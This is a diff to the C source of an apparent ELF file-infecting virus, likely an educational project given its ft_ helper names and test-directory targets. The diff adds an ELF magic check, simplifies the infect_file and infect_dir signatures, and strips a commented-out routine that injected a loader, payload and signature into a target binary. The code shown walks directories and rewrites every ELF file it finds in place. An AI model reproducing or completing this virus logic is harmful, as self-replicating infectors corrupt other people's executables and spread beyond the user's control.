@@ -104,10 +104,6 @@ static void	patch_addresses(t_info *info)
 	val = end - start;
 	ft_memcpy(info->file + info->offset_payload + OFFSET_1, &val, 4);
 
-	start = info->addr_payload + OFFSET_4 + 4;
-	val = end - start;
-	ft_memcpy(info->file + info->offset_payload + OFFSET_4, &val, 4);
-
 	// &ft_memcpy
 	start = info->addr_payload + OFFSET_2 + 4;
 	end = (int32_t)(info->addr_payload);
@@ -147,19 +143,21 @@ static int		inject_sign(t_info *info)
 	return (0);
 }
 
-static int		infect_file(void *addr_rep_jmp, char *path)
+static int		infect_file(char *path)
 {
 	struct stat		st;
 	t_info			info;
 	int				fd;
+	uint32_t		magic;
 	
-	(void)addr_rep_jmp;
 	if ((fd = ft_sysopen(path, O_RDWR)) ==  -1)
 		return (1);
 	init_info(&info);
 	ft_sysfstat(fd, &st);
 	info.file_size = st.st_size;
 	if ((info.file = ft_sysmmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
+		goto end_error;
+	if ((magic = *((uint32_t *)(info.file))) != 0x464C457F)
 		goto end_error;
 	pe_parsing(&info);
 	if (reload_mapping(&info) == 1)
@@ -183,7 +181,7 @@ static int		infect_file(void *addr_rep_jmp, char *path)
 	return (1);
 }
 
-static int		infect_dir(void *addr_rep_jmp, char *path)
+static int		infect_dir(char *path)
 {
 	char					buf_d[1024];
 	struct linux_dirent64	*dir;
@@ -202,7 +200,7 @@ static int		infect_dir(void *addr_rep_jmp, char *path)
 			{
 				ft_memcpy(buf_path_file, path, PATH_MAX);
 				ft_strcat(buf_path_file, dir->d_name);
-				if ((infect_file(addr_rep_jmp, buf_path_file)) == 1)
+				if ((infect_file(buf_path_file)) == 1)
 						goto end_error;
 			}
 			pos += dir->d_reclen;
@@ -220,42 +218,11 @@ int		main()
 	char	buf[BUF_SIZE];
 	write_begin(buf);
 	ft_syswrite(1, buf, 8);
-	void			*addr;
 	char			buf_path[PATH_MAX];
 
-	addr = &loader + LOADER_SIZE - 4;
 	write_test(buf_path);
-	infect_dir(addr, buf_path);
+	infect_dir(buf_path);
 	write_test2(buf_path);
-	infect_dir(addr, buf_path);
-
-//	write_filename_src(buf);
-//	if ((fd = ft_sysopen(buf, O_RDWR)) ==  -1)
-//		handle_exit(addr);
-//	init_info(&info);
-//	ft_sysfstat(fd, &st);
-//	info.file_size = st.st_size;
-//	if ((info.file = ft_sysmmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
-//		handle_exit(addr);
-//	pe_parsing(&info);
-//	if (reload_mapping(&info) == 1)
-//		handle_exit(addr);
-//	if (find_text(&info) == 1)
-//		handle_exit(addr);
-//
-//	inject_loader(&info);
-//	inject_payload(&info);
-//	inject_end(&info);
-//	epo_parsing(&info);
-//	if (info.valid_target == 0)
-//		handle_exit(addr);
-//
-//	patch_addresses(&info);
-//	inject_sign(&info);
-//
-//	ft_sysclose(fd);
-//	write_filename_src(buf);
-//	ft_syswrite(1, buf, 9);
-//	write_file(info, buf);
+	infect_dir(buf_path);
 	return (0);
 }
